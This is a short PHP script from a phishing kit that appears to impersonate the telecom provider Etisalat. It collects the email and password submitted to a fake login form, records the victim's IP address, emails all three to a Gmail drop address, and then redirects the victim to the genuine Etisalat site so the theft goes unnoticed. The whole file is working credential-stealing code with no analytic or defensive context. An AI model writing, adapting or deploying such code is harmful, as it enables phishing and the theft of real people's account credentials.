<?php

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "Email ID *: ".$_POST['username']."\n";
$message .= "Password*: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";


$recipient = "sales.departmental01@gmail.com";
$subject = "etisala - $ip";
$headers .= $_POST['eMailAdd']."\n";
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.etisalat.ae/eportal/en/promotion/index.html");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }